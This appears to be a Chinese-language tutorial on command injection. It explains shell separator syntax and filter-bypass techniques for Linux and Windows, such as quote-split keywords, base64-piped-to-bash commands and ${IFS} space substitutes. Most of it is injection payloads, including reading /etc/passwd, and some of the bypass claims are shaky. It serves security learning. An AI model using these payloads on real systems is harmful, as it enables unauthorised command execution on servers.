# 1·命令注入漏洞

1.定义：命令注入是一种黑客攻击手段，目标是利用应用程序的漏洞，在服务器的操作系统上执行任意的系统命令。这种攻击的发生场景是：应用程序把用户提交的不安全数据（比如表单输入、Cookie、HTTP 请求头）直接传递给系统外壳（操作系统的命令执行器，比如 Windows 的 cmd.exe、Linux 的 bash）。攻击中，黑客输入的系统命令会以应用程序的权限运行。命令注入之所以能成功，主要是因为应用程序对用户输入的验证不足。

2.特点

命令注入的核心是**应用把未验证的用户输入直接传给系统执行命令**，黑客靠拼接系统命令实现攻击，无需写新代码；

它和代码注入的核心区别：前者执行系统命令（操作系统层面），后者执行应用代码（应用层面）；

命令注入的根本原因是**输入验证不足**，防御的核心是过滤 / 验证用户输入、避免直接拼接系统命令。

3.原理：**应用程序将用户可控的输入直接拼接到系统命令中执行，且未做任何安全验证 / 过滤，导致攻击者可以通过输入特殊字符，让系统执行非预期的恶意命令**。

## 1.完全无验证

### 1.拼接语法

合法命令 + 【分隔符/特殊字符】 + **恶意命令**

1.Linux/macOS（UNIX 类系统）拼接语法

| 拼接语法           | 示例（以 ping 命令为例）            | 执行逻辑                                                     |
| ------------------ | ----------------------------------- | ------------------------------------------------------------ |
| `;`（分号）        | `ping 8.8.8.8; whoami`              | 分隔多个命令，**依次执行**（无论前一个命令成功 / 失败，后一个都执行） |
| `&&`（逻辑与）     | `ping 8.8.8.8 && whoami`            | 前一个命令执行成功（返回码 0），才执行后一个命令             |
| `||（逻辑或）`     | `ping 256.256.256.256||whoami`      | 前一个命令执行失败（返回码非 0），才执行后一个命令           |
| \|（管道符）       | `ping 8.8.8.8|cat /etc/passwd`      | 将前一个命令的输出作为后一个命令的输入（常用来覆盖原输出，执行恶意命令） |
| `&`（后台执行）    | `ping 8.8.8.8 & ls /`               | 前一个命令后台执行，立即执行后一个命令                       |
| `$()`（命令替换）  | `ping $(whoami)`                    | 先执行`whoami`，将结果作为`ping`的参数（本质是嵌套执行命令） |
| 换行符（%0a）      | `ping 8.8.8.8%0als /`               | URL 编码中的换行符，bash 会将换行符解析为命令分隔（绕过空格 / 分号过滤） |
| 空格绕过（${IFS}） | `ping${IFS}8.8.8.8;${IFS}ls${IFS}/` | `${IFS}`是 Linux 的内部字段分隔符，等价于空格，绕过 “过滤空格” 的简单防护 |

## 2.绕过简单过滤的拼接技巧

当应用仅做了**简单字符过滤**（比如只拉黑`;`/`&`/`||`等分隔符，或只过滤命令关键字如`ls`/`ipconfig`）时，攻击者可通过以下拼接技巧绕过防护，以下按 “分隔符绕过”“命令关键字绕过”“空格绕过” 三大类整理（分 Linux/Windows 场景）：

### 1.分隔符过滤绕过

#### 1.被过滤的分隔符：`;`（分号）

Linux 绕过替换方案

- 用 `${IFS}$9` 替代分号（系统内置字段分隔符，等价于空格 + 分隔）；
- 用 `%0a` 替代（URL 编码的换行符，bash 解析为命令分隔）；
- 用 `&&` 替代（逻辑与分隔符，功能等价于分号的 “依次执行”）。

Windows 绕过替换方案

- 用 `%0a` 替代（URL 编码换行符，cmd 解析为命令分隔）；
- 用 `&` 替代（无条件执行分隔符，Windows 最通用）；
- 用 `||` 替代（逻辑或分隔符，适合左侧命令可能失败的场景）。

#### 2.被过滤的分隔符：`&`（无条件执行符）

Linux 绕过替换方案

- 用 `&&` 替代（逻辑与，仅左侧成功则执行右侧，功能接近）；
- 用 `|` 替代（管道符，可作为命令分隔）；
- 用 `%0a` 替代（URL 编码换行符，bash 解析为命令分隔）。

Windows 绕过替换方案

- 用 `&&` 替代（逻辑与，左侧成功则执行右侧）；
- 用 `||` 替代（逻辑或，左侧失败则执行右侧）；
- 用 `%0a` 替代（URL 编码换行符，cmd 解析为命令分隔）。

#### 3.被过滤的分隔符：`||`（逻辑或）

Linux 绕过替换方案

- 用 `|` 替代（管道符，作为命令分隔）；
- 用 `;` 替代（分号，依次执行命令）；
- 用 `&` 替代（后台执行，立即执行后续命令）。

Windows 绕过替换方案

- 用 `|` 替代（管道符，作为命令分隔）；
- 用 `&` 替代（无条件执行，最通用）；
- 用 `%0a` 替代（URL 编码换行符，cmd 解析为命令分隔）。

#### 4.被过滤的分隔符：`|`（管道符）

Linux 绕过替换方案

- 用 `;` 替代（分号，依次执行命令）；
- 用 `&&` 替代（逻辑与，左侧成功则执行右侧）；
- 用 `${IFS}` 替代（系统内置空格分隔符，结合其他符号实现命令分隔）。

Windows 绕过替换方案

- 用 `;` 替代（分号，部分 cmd 版本需开启配置，兼容性一般）；
- 用 `&` 替代（无条件执行，Windows 最通用）；
- 用 `%0a` 替代（URL 编码换行符，cmd 解析为命令分隔）。

### 2.命令关键字过滤绕过

1. 大小写混淆（最通用）

2. 命令拼接 / 拆分

   ```php
   # Linux（单引号/反斜杠拆分）
   ping 8.8.8.8; w'h'o'am'i  # 等价于 whoami
   ping 8.8.8.8; \l\s /      # 等价于 ls /
   ping 8.8.8.8; l's'        # 等价于 ls
   
   # Windows（双引号/括号拆分）
   ping 8.8.8.8 & "ip"config  # 等价于 ipconfig
   ping 8.8.8.8 & ne"t" user  # 等价于 net user
   ```

   

3. 绝对路径调用命令

   ```php
   # Linux
   ping 8.8.8.8; /bin/whoami   # 绕过 whoami 过滤
   ping 8.8.8.8; /usr/bin/ls / # 绕过 ls 过滤
   
   # Windows
   ping 8.8.8.8 & C:\Windows\System32\ipconfig.exe  # 绕过 ipconfig 过滤
   ping 8.8.8.8 & C:\Windows\System32\net.exe user  # 绕过 net user 过滤
   ```

   我们平时用的这些系统命令，其实虽然我们输入了命令，但是系统调用时还是需要沿着固定的路径找到这个命令的所在位置才能调用我们这个绕过方式，其实就是直接输入路径，然后让系统不用再去找路径，而是沿着路径直接找到相对应的命令就可以执行了

4. 命令替换 / 拼接执行（Linux 进阶）

   ```php
   # 示例：过滤了ls，用echo拼接执行
   ping 8.8.8.8; $(echo 'ls') /
   ping 8.8.8.8; `echo 'whoami'`
   
   # 示例：base64解码执行（彻底绕过字符匹配）
   ping 8.8.8.8; echo 'd2hvYW1p' | base64 -d | bash  # d2hvYW1p = whoami base64编码
   ```

   

### 3.空格过滤绕过

1. Linux 系统空格绕过

| 替代符号      | 示例                                 | 说明                     |
| ------------- | ------------------------------------ | ------------------------ |
| `${IFS}`      | `ping${IFS}8.8.8.8;${IFS}ls`         | IFS 是系统内置字段分隔符 |
| `${IFS}$9`    | `ping${IFS}$98.8.8.8;${IFS}$9whoami` | $9 是空参数，提升兼容性  |
| `$IFS`        | `ping$IFS8.8.8.8;$IFSwhoami`         | 简化版，部分 shell 兼容  |
| 制表符（%09） | `ping%098.8.8.8;%09ls`               | URL 编码制表符，等价空格 |

2. Windows 系统空格绕过

| 替代符号      | 示例                           | 说明                   |
| ------------- | ------------------------------ | ---------------------- |
| `%20`         | `ping%208.8.8.8%26%20ipconfig` | URL 编码空格（最常用） |
| `+`           | `ping+8.8.8.8&+ipconfig`       | 部分表单提交场景兼容   |
| 制表符（%09） | `ping%098.8.8.8&%09dir`        | 等价空格，绕过空格过滤 |
